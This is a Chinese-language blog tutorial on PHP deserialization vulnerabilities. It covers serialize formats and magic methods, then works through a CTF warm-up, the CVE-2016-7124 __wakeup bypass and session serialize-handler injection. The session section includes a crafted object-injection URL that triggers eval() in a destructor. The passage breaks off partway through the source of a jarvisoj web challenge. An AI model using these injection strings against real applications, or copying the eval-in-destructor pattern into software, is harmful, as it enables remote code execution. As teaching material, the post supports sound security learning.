<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>浅析PHP反序列化漏洞 - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>浅析PHP反序列化漏洞</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2019-06-05 17:00</div>
  <div>
    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>很久没有些文章了，今天复习了反序列化漏洞的知识，顺便写了一篇文章。</p>
<h1 id="0x02-php序列化和反序列化基础">0x02 PHP序列化和反序列化基础</h1>
<p>我们想要将数组值存储到数据库时，就可以对数组进行序列化操作，然后将序列化后的值存储到数据库中。其实PHP序列化数组就是将复杂的数组数据类型转换为字符串，方便数组存库操作。对PHP数组进行序列化和反序列化操作，主要就用到两个函数，serialize和unserialize。</p>
<h2 id="php序列化serialize">PHP序列化：serialize</h2>
<p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
<p>序列化函数原型如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">string</span> <span style="color:#a6e22e">serialize</span> ( <span style="color:#a6e22e">mixed</span> $value )
</code></pre></div><p>先看个例子</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span> <span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TEST</span> {
    <span style="color:#66d9ef">public</span> $data;
    <span style="color:#66d9ef">private</span> $pass;

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($data, $pass)
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> $data;
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pass</span> <span style="color:#f92672">=</span> $pass;
    }
}
$number <span style="color:#f92672">=</span> <span style="color:#ae81ff">34</span>;
$str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user&#39;</span>;
$bool <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
$null <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;
$arr <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">10</span>, <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">200</span>);
$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">TEST</span>(<span style="color:#e6db74">&#39;uu&#39;</span>, <span style="color:#66d9ef">true</span>);
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">serialize</span>($number));
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">serialize</span>($str));
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">serialize</span>($bool));
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">serialize</span>($null));
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">serialize</span>($arr));
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">serialize</span>($test));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>输出结果为：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/1.png" alt=""></p>
<p>所以序列化对于不同类型得到的字符串格式为：</p>
<ul>
<li><code>String</code> : s:size:value;</li>
<li><code>Integer</code> : i:value;</li>
<li><code>Boolean</code> : b:value;(保存1或0)</li>
<li><code>Null</code> : N;</li>
<li><code>Array</code> : a:size:{key definition;value definition;(repeated per element)}</li>
<li><code>Object</code> : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</li>
</ul>
<p>从上面最后一个结果有个问题，为什么会出现不明符号，因为变量是private的所以序列号的时候会在两侧加入空字节，而且是private属性的变量都会在变量前面加上加上类名。</p>
<h2 id="php反序列化unserialize">PHP反序列化：unserialize</h2>
<p>unserialize() 是对单一的已序列化的变量进行操作，将其转换回PHP 的值。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">unserialize</span> ( <span style="color:#a6e22e">string</span> $str )
</code></pre></div><p>例子：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
$str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;O:4:&#34;TEST&#34;:2:{s:4:&#34;data&#34;;s:2:&#34;uu&#34;;s:10:&#34; TEST pass&#34;;b:1;}&#39;</span>;
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">unserialize</span>($str));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>输出结果为：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/2.png" alt=""></p>
<h1 id="0x03-常见魔术方法">0x03 常见魔术方法</h1>
<p>在利用对PHP序列号和反序列化时，都需要经过当中的魔术方法，检查方法里有无敏感操作来进行利用。</p>
<p><strong>常见方法</strong></p>
<pre><code>__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发
</code></pre><h2 id="__sleep">__sleep()</h2>
<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。<code>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</code></p>
<p>看个例子：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SITE</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uusama&#39;</span>;

    <span style="color:#66d9ef">public</span> $username;
    <span style="color:#66d9ef">public</span> $nickname;
    <span style="color:#66d9ef">private</span> $password;

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username, $nickname, $password)
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nickname</span> <span style="color:#f92672">=</span> $nickname;
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $password;
    }

    <span style="color:#75715e">// 重载序列化调用的方法
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __sleep()
    {
        <span style="color:#75715e">// 返回需要序列化的变量名，过滤掉password变量
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;username&#39;</span>, <span style="color:#e6db74">&#39;nickname&#39;</span>);
    }
}
$user <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>(<span style="color:#e6db74">&#39;uusama&#39;</span>, <span style="color:#e6db74">&#39;uu&#39;</span>, <span style="color:#e6db74">&#39;123456&#39;</span>);
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">serialize</span>($user));
</code></pre></div><p>输出的结果很显然序列化的时候忽略了 password 字段的值。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/3.png" alt=""></p>
<h2 id="__wakeup">__wakeup()</h2>
<p>unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup() </code>方法，预先准备对象需要的资源。</p>
<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<p>看个例子：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SITE</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uusama&#39;</span>;

    <span style="color:#66d9ef">public</span> $username;
    <span style="color:#66d9ef">public</span> $nickname;
    <span style="color:#66d9ef">private</span> $password;
    <span style="color:#66d9ef">private</span> $order;

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username, $nickname, $password)
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nickname</span> <span style="color:#f92672">=</span> $nickname;
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $password;
    }

    <span style="color:#75715e">// 定义反序列化后调用的方法
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span>;
    }
}
$user_ser <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:6:&#34;uusama&#34;;s:8:&#34;nickname&#34;;s:2:&#34;uu&#34;;}&#39;</span>;
<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">unserialize</span>($user_ser));
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/4.png" alt=""></p>
<ul>
<li><code>__wakeup()</code>函数在对象被构建以后执行，所以$this-&gt;username的值不为空</li>
<li>反序列化时，会尽量将变量值进行匹配并复制给序列化后的对象</li>
</ul>
<h2 id="__construct">__construct</h2>
<p><code>__construct()</code>被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。</p>
<p>例子：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{

    <span style="color:#66d9ef">public</span> $username;

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username, $nickname, $password)
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;__construct test&#34;</span>;
    }

  
}
$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>(<span style="color:#e6db74">&#34;F0rmat&#34;</span>);

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>输出结果：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/5.png" alt=""></p>
<h2 id="__destruct">__destruct()</h2>
<p>对象的所有引用都被删除或者当对象被显式销毁时执行<code>__destruct()</code></p>
<p>例子:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
    {
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;__destruct test&#34;</span>;
    }	  
}
$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>输出结果：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/6.png" alt=""></p>
<h2 id="__tostring">__ToString()</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">__toString</span> ( <span style="color:#a6e22e">void</span> ) <span style="color:#f92672">:</span> <span style="color:#a6e22e">string</span>
</code></pre></div><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a> 方法用于一个类被当成字符串时应怎样回应。例如 <em>echo $obj;</em> 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 <strong>E_RECOVERABLE_ERROR</strong> 级别的致命错误。</p>
<p>例子：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TestClass</span>
{
    <span style="color:#66d9ef">public</span> $foo;

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($foo) 
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> $foo;
    }

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString() {
        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">foo</span>;
    }
}

$class <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">TestClass</span>(<span style="color:#e6db74">&#39;Hello&#39;</span>);
<span style="color:#66d9ef">echo</span> $class;
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>输出的结果：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/7.png" alt=""></p>
<h2 id="热身题">热身题</h2>
<p><a href="http://120.79.33.253:9001/">http://120.79.33.253:9001/</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
$KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;D0g3!!!&#34;</span>;
$str <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;str&#39;</span>];
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unserialize</span>($str) <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$KEY</span><span style="color:#e6db74">&#34;</span>)
{
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$flag</span><span style="color:#e6db74">&#34;</span>;
}
<span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
</code></pre></div><p>只要后面接受的<code>str</code>参数反序列化得到<code>D0g3!!!</code>就可以了得到flag了</p>
<p><a href="http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22">http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</a></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/8.png" alt=""></p>
<h2 id="反序列化对象注入-cve-2016-7124">反序列化对象注入-CVE-2016-7124</h2>
<p><a href="https://bugs.php.net/bug.php?id=72663">CVE-2016-7124</a>，简单来说就是<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</strong></p>
<p>我们用一个例子来理解这个漏洞原理：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
   <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>{
        <span style="color:#66d9ef">public</span> $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag&#39;</span>;
        <span style="color:#66d9ef">function</span> __destruct(){
            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key</span>)){
                <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;flag&#39;</span>)
                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;success&#39;</span>;
            }
        }
        <span style="color:#66d9ef">function</span> __wakeup(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;you failed 23333&#39;</span>;
            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key</span>;
        }
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString(){
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
        }
    }
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;answer&#39;</span>])){
        <span style="color:#a6e22e">show_source</span>(<span style="color:#e6db74">&#39;index.php&#39;</span>);
    }<span style="color:#66d9ef">else</span>{
        $answer <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;answer&#39;</span>];
        <span style="color:#66d9ef">echo</span> $answer;
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>;
        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">unserialize</span>($answer);<span style="color:#75715e">//
</span><span style="color:#75715e"></span>    }

 <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>构造正常反序列化对象：<code>O:4:&quot;Test&quot;:2:{s:3:&quot;key&quot;;s:4:&quot;flag&quot;;}</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/9.png" alt=""></p>
<p>发现<code>__wakeup()</code>会先执行，<code>__destruct()</code>中的判断不成立，无法输出success，尝试将对象属性个数1改为任意大于1的数，即可绕过<code>__wakeup()</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/10.png" alt=""></p>
<h1 id="0x04-session反序列化漏洞">0x04 session反序列化漏洞</h1>
<h2 id="简介">简介</h2>
<p>首先我们需要了解session反序列化是什么？
PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化
在php.ini中有以下配置项，mamp的默认配置如图</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/11.png" alt=""></p>
<p><code>session.save_path</code> 设置session的存储路径
<code>session.save_handler</code> 设定用户自定义存储函数
<code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话
<code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php
除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p>
<table>
<thead>
<tr>
<th style="text-align:left">处理器</th>
<th style="text-align:left">对应的存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">php</td>
<td style="text-align:left">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td style="text-align:left">php_binary</td>
<td style="text-align:left">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td style="text-align:left">php_serialize  (php&gt;=5.5.4)</td>
<td style="text-align:left">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody>
</table>
<h2 id="存储机制">存储机制</h2>
<p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。
来测试一个demo</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
    <span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;session.serialize_handler&#39;</span>,<span style="color:#e6db74">&#39;php&#39;</span>);
    <span style="color:#a6e22e">session_start</span>();

    $_SESSION[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test&#39;</span>;
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>运行后在配置文件设定的路径中会生成一个session文件</p>
<p>我的文件是保存在<code>/Applications/MAMP/tmp/php</code>目录下</p>
<ul>
<li>当<code>session.serialize_handler</code>为<code>php</code>时</li>
</ul>
<pre><code>name|s:4:&quot;test&quot;;
</code></pre><ul>
<li>当<code>session.serialize_handler</code>为<code>php_serialize</code>时</li>
</ul>
<pre><code>a:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}
</code></pre><ul>
<li>当<code>session.serialize_handler</code>为<code>php_binary</code>时</li>
</ul>
<pre><code>&lt;0x04&gt;names:4:&quot;test&quot;;
</code></pre><p>三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p>
<h2 id="php-session中的序列化危害">PHP Session中的序列化危害</h2>
<p>HP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。
如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$_SESSION[<span style="color:#e6db74">&#39;ryat&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;|O:11:&#34;PeopleClass&#34;:0:{}&#39;</span>;
</code></pre></div><p>上述的$_SESSION的数据使用<code>php_serialize</code>，那么最后的存储的内容就是<code>a:1:{s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;}</code>。
但是我们在进行读取的时候，选择的是<code>php</code>，那么最后读取的内容是:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">array</span> (<span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
  <span style="color:#e6db74">&#39;a:1:{s:6:&#34;spoock&#34;;s:24:&#34;&#39;</span> <span style="color:#f92672">=&gt;</span> 
    <span style="color:#a6e22e">object</span>(<span style="color:#a6e22e">__PHP_Incomplete_Class</span>)[<span style="color:#ae81ff">1</span>]
      <span style="color:#66d9ef">public</span> <span style="color:#e6db74">&#39;__PHP_Incomplete_Class_Name&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">string</span> <span style="color:#e6db74">&#39;PeopleClass&#39;</span> (<span style="color:#a6e22e">length</span><span style="color:#f92672">=</span><span style="color:#ae81ff">11</span>)

</code></pre></div><p>这是因为当使用php引擎的时候，php引擎会以**|**作为作为key和value的分隔符，那么就会将<code>a:1:{s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:{}</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。
这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
<p>举个例子来理解：</p>
<p>存在us1.php和us2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、
us1.php，使用php_serialize来处理session</p>
<p>新建文件us1.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;session.serialize_handler&#39;</span>, <span style="color:#e6db74">&#39;php_serialize&#39;</span>);
<span style="color:#a6e22e">session_start</span>();
$_SESSION[<span style="color:#e6db74">&#34;spoock&#34;</span>]<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#34;a&#34;</span>];
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>新建文件us2.php,使用php来处理session</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;session.serialize_handler&#39;</span>, <span style="color:#e6db74">&#39;php&#39;</span>);
<span style="color:#a6e22e">session_start</span>();
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">lemon</span> {
    <span style="color:#66d9ef">var</span> $hi;
    <span style="color:#66d9ef">function</span> __construct(){
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hi</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;phpinfo();&#39;</span>;
    }

    <span style="color:#66d9ef">function</span> __destruct() {
        <span style="color:#66d9ef">eval</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hi</span>);
    }
}
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>访问<code>http://127.0.0.1/us1.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;}</code></p>
<p>此时传入的数据会按照<strong>php_serialize</strong>来进行序列化。
此时访问us2.php时，页面输出，<code>spoock</code>成功执行了我们构造的函数。因为在访问us2.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/12.png" alt=""></p>
<p>如果还是不理解，可以用PHPstorm工具来进行动态debug代码，可以参考我之前的文章[https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/](<a href="https://getpass.cn/2018/04/10/Breakpoint">https://getpass.cn/2018/04/10/Breakpoint</a> debugging with phpstorm+xdebug/)</p>
<p>执行的时候，session反序列化会执行里面销毁前的魔术函数<code>__destruct()</code>，前面的<code>__construct()</code>就不再执行了。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/13.png" alt=""></p>
<h2 id="jarvisoj-web的一道session反序列化">jarvisoj-web的一道SESSION反序列化</h2>
<p>题目入口(<a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a>)
Index页给源码：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#75715e">//A webshell is wait for you
</span><span style="color:#75715e"></span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;session.serialize_handler&#39;</span>, <span style="color:#e6db74">&#39;php&#39;</span>);
<span style="color:#a6e22e">session_start</span>();
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">OowoO</span>
{
    <span style="color:#66d9ef">public</span> $mdzz;
    <span style="color:#66d9ef">function</span> __construct()
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">mdzz</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;phpinfo();&#39;</span>;
    }
    
    <span style="color:#66d9ef">function</span> __destruct()
    {
        <span style="color:#66d9ef">eval</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">mdzz</span>);
    }
}
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;phpinfo&#39;</span>]))
{
